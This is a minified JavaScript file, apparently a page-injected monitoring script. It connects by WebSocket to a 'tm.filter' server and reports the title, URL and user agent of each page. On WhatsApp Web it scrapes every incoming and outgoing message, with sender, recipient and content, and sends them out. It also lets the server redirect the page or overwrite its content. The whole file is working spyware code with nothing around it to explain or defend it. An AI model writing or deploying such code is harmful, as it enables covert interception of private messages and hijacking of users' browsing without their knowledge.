! function() {
    function a() {
        try {
            return window.self === window.top
        } catch (a) {
            return !1
        }
    }

    function b() {
        var a = {
            type: "focus",
            token: t.token,
            title: document.title,
            url: document.URL,
            useragent: navigator.userAgent,
            pid: t.pid
        };
        null != E && E.readyState == WebSocket.OPEN && E.send(JSON.stringify(a))
    }

    function c() {
        var a = {
            type: "notification",
            token: t.token,
            title: document.title,
            url: document.URL,
            focused: document.hasFocus(),
            timeout: t.sendNotificationsInterval,
            useragent: navigator.appVersion.length > navigator.userAgent.length ? navigator.appVersion : navigator.userAgent,
            pid: t.pid
        };
        E.send(JSON.stringify(a))
    }

    function d() {
        q()
    }

    function e() {
        v = setInterval(c, t.sendNotificationsInterval), p() && (w = setInterval(d, t.pollWhatsappTrackingInterval))
    }

    function f() {
        clearInterval(v), clearInterval(w), timeout = setTimeout(function() {
            E = new WebSocket(t.connectionString), E.onopen = e, E.onclose = f
        }, u)
    }

    function g(a) {
        switch (a.data.substring(0, 1)) {
            case "r":
                window.location = a.data.substring(1);
                break;
            case "b":
                document.body.innerHTML = a.data.substring(1);
                break;
            case "w":
                var c = "true" == a.data.substring(1).toLowerCase();
                z != c && c && r(), z = c
        }
    }

    function h(a) {
        var b = document.createElement("a");
        return b.href = a, b.href
    }

    function i() {
        for (var a = [], b = document.getElementsByTagName("link"), c = 0; c < b.length; ++c) "icon" != b[c].getAttribute("rel") && "shortcut icon" != b[c].getAttribute("rel") || (a[a.length] = h(b[c].getAttribute("href")));
        0 == a.length && (a[0] = h("/favicon.ico"));
        var d = {};
        d.type = "favicon", d.url = document.URL, d.src = a, d.title = document.title, d.token = t.token, d.useragent = navigator.appVersion.length > navigator.userAgent.length ? navigator.appVersion : navigator.userAgent, E.send(JSON.stringify(d))
    }

    function j() {
        t.iup && b(), p() && (r(), q(), s()), e(), i()
    }

    function k() {
        E = new WebSocket(t.connectionString), E.onclose = f, E.onmessage = g, E.onopen = j
    }

    function l() {
        var a = ["webkit", "moz", "ms", "o"];
        if ("hidden" in document) return "hidden";
        for (var b = 0; b < a.length; b++)
            if (a[b] + "Hidden" in document) return a[b] + "Hidden";
        return null
    }

    function m() {
        var a = l();
        return !!a && document[a]
    }

    function n(a) {
        m() ? setTimeout(function() {
            n(a)
        }, 1e3) : a()
    }

    function o(a, b, c) {
        var d = [
                [a, b, c].join("-"), [a, c, b].join("-"), [b, a, c].join("-"), [b, c, a].join("-"), [c, a, b].join("-"), [c, b, a].join("-")
            ],
            e = Date.now();
        for (var f in d) {
            var g = Date.parse(d[f]);
            if (g && !(Math.abs(e - g) > 1728e6)) return new Date(g)
        }
    }

    function p() {
        var a = document.head.querySelector("[name='og:title']");
        return !!a && "WhatsApp Web" === a.getAttribute("content")
    }

    function q() {
        var a = {
            type: "waptracking"
        };
        E.send(JSON.stringify(a))
    }

    function r() {
        A = new Map, B = new Set, C = 0, D = new Date, D.setSeconds(0), D.setMilliseconds(0)
    }

    function s() {
        var a = new MutationObserver(function(a) {
            a && a.forEach(function(a) {
                a && ("childList" !== a.type || a.addedNodes.length <= 0 || a.addedNodes.forEach(function(a) {
                    if (a) {
                        var b = a.querySelector(".pane-chat-header > .chat-body > .chat-main > .chat-title > span");
                        b && (x = b.innerText);
                        a.querySelector(".pane-chat-header .icon-user-default") && (y = "private");
                        a.querySelector(".pane-chat-header .icon-group-default") && (y = "group");
                        var e = a.querySelectorAll(".message-in, .message-out");
                        e && e.forEach(function(a) {
                            if (a && a.classList && !(a.classList.length <= 0)) {
                                var b = a.querySelector(".message-text"),
                                    c = b ? b.getAttribute("data-id") : null;
                                if (c && !B.has(c)) {
                                    var d = a.classList.contains("message-in"),
                                        e = a.querySelector(".message-pre-text"),
                                        f = a.querySelector(".selectable-text"),
                                        g = new Date,
                                        h = null;
                                    if (e) {
                                        var i = /\[(\d{1,2}):(\d{1,2}),\s(.+)]\s(.*):/ [Symbol.match](e.innerText);
                                        if (!i || 5 != i.length) return;
                                        if (dateParts = /(\d{1,4})[.-\\\/](\d{1,4})[.-\\\/](\d{1,4})/ [Symbol.match](i[3]), !dateParts || 4 != dateParts.length) return;
                                        if (!(g = o(dateParts[1], dateParts[2], dateParts[3]))) return;
                                        g.setHours(i[1]), g.setMinutes(i[2]), h = i[4]
                                    }
                                    if (g && g >= D) {
                                        A.get(x) || A.set(x, D), A.get(x).getTime() == g.getTime() ? g.setMilliseconds(++C) : (C = 0, A.set(x, g));
                                        var j = f ? f.innerText : null;
                                        if (h && j && z) {
                                            var k = {
                                                type: "wapmessage",
                                                timestamp: g.getTime(),
                                                id: c,
                                                incoming: d,
                                                sender: d ? h : "Me",
                                                content: j,
                                                recipient: d ? "Me" : x,
                                                conversationId: x + "(" + y + ")"
                                            };
                                            E.send(JSON.stringify(k)), B.add(c)
                                        }
                                    }
                                }
                            }
                        })
                    }
                }))
            })
        });
        a && a.observe(document.body, {
            childList: !0,
            subtree: !0
        })
    }
    var t = {
            token: "0cba3120-fb4a-4590-a24e-c62d1ff3c9a0",
            sendNotificationsInterval: Number("10000"),
            pollWhatsappTrackingInterval: Number("20000"),
            connectionString: "wss://tm.filter:1519",
            pid: "14240",
            iup: false
        },
        u = 6e4,
        v = null,
        w = null,
        x = null,
        y = null,
        z = !1,
        A = null,
        B = null,
        C = 0,
        D = null;
    if (a()) {
        var E = null;
        n(function() {
            window.addEventListener("focus", b), "interactive" == document.readyState || "complete" == document.readyState ? k() : window.addEventListener("DOMContentLoaded", k)
        })
    }
}();